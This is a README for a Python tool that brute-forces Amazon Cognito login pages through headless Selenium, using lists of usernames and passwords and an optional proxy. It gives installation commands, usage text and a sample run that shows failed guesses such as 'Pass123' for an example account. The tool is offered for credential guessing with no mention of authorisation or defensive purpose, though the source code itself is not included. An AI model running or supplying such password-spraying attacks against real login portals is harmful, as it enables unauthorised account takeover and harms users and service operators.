Brute force Amazon Cognito with headless selenium.

## Installation

Clone the Repository:
```
git clone https://github.com/yourusername/cognito-brute-force.git
cd cognito-brute-force
```
Setup Python Environment:
```
python -m venv venv
source venv/bin/activate # On Windows use venv\Scripts\activate
```
Install Dependencies:
```
pip install -r requirements.txt
```
Run the Script:
```
python cognitobrute.py [options]
```

## Usage

```
usage: cognitobrute.py [-h] [--proxy PROXY] url username_file password_file

Amazon Cognito Login Bruteforcer

positional arguments:
  url            Base URL for login
  username_file  File containing usernames
  password_file  File containing passwords

options:
  -h, --help     show this help message and exit
  --proxy PROXY  Proxy address (optional)
```


 ## Example Running

 ```
 python cognitobrute.py example.com/login usernames.txt passwords.txt --proxy 127.0.0.1:8080

Login failed for foo@example.com with password Pass1! Incorrect username or password.
Login failed for foo@example.com with password Pass12: Incorrect username or password.
Login failed for foo@example.com with password Pass123: Incorrect username or password.
```